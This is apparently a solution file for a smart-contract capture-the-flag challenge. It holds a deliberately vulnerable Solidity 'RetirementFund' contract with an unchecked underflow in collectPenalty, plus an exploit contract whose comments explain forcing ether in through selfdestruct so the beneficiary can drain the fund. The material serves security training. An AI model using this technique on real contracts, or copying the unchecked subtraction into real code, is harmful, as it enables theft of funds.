// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok, ) = msg.sender.call{
                value: (address(this).balance * 9) / 10
            }("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    RetirementFund public retirementFund;
    // I'm player. I can't call withdraw due to it checks the owner.
    // So the collectPenalty is the entry that I can exploit.
    // Is there some way to pass (withdrawn > 0) ? It's startBalance - balanceNow.
    // With the startBalance is fixed, the balance of the contract is only state I can exploit.
    // Make the withdrawn overflow through balance > startBalance.
    // deposit some ether, and  call collectPenalty then, withdrawn > 0 will be passed.
    // But there is not any function payable. I can't deposit to it directly.
    // Selfdestruct is a way to deposit to it.
    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }

    // write your exploit functions below
    function destory() public {
        selfdestruct(payable(address(retirementFund)));
    }

    receive() external payable {}

}
